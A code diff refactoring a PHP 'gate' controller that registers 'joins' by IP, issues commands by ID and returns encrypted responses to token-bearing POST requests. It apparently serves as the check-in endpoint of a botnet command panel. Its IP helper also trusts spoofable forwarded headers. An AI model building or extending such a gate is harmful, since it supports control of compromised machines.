@@ -16,17 +16,10 @@ class gate extends Controller
 
         if (empty($_POST) || ! isset($_POST['x']) && empty($_POST['x']) || ! isset(getallheaders()['X-Token']) && empty(getallheaders()['X-Token'])) {
             //here if the request isnt post it returns your ip
-            $ip = null;
-            if (! empty($_SERVER['HTTP_CLIENT_IP'])) {
-                $ip = $_SERVER['HTTP_CLIENT_IP'];
-            } elseif (! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-            } else {
-                $ip = $_SERVER['REMOTE_ADDR'];
-            }
+            $ip = $this->getClientIP();
             $view = $this->loadView('gate');
 
-            return $view->render(['data' => $ip]);
+            return $view->render(['data' => $ip], false);
         }
 
         //load the helper
@@ -48,14 +41,7 @@ class gate extends Controller
             case 0:
                 //its a join
                 //handle the db incertion
-                $ip = null;
-                if (! empty($_SERVER['HTTP_CLIENT_IP'])) {
-                    $ip = $_SERVER['HTTP_CLIENT_IP'];
-                } elseif (! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-                } else {
-                    $ip = $_SERVER['REMOTE_ADDR'];
-                }
+                $ip = $this->getClientIP();
                 $_dbcommand = $commandData;
                 $_dbcommand .= '@'.$ip;
 
@@ -138,9 +124,19 @@ class gate extends Controller
         $pdo = null;
         $view = $this->loadView('gate');
 
-        return $view->render(['data' => $encryptedResponse]);
+        return $view->render(['data' => $encryptedResponse], false);
+    }
 
-        //die($encryptedResponse);
+    protected function getClientIP()
+    {
+        if (! empty($_SERVER['HTTP_CLIENT_IP'])) {
+            return $_SERVER['HTTP_CLIENT_IP'];
+        }
+        if (! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            return $_SERVER['HTTP_X_FORWARDED_FOR'];
+        }
+
+        return $_SERVER['REMOTE_ADDR'];
     }
 
     private function CreateCommand($commandId, $commandType, $data)
